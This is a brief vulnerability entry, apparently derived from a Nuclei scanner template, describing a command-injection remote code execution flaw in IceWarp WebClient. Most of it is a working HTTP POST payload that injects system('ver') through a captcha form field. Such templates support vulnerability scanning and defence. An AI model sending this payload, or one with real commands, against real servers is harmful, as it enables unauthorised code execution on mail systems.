# Vulnerability: IceWarp WebClient - Remote Code Execution
**Classification:** CWE-77
**Source:** Nuclei Template (`icewarp-webclient-rce.yaml`)

## Description
IceWarp WebClient is susceptible to remote code execution.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /webmail/basic/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

_dlg[captcha][target]=system(\'ver\')\
```

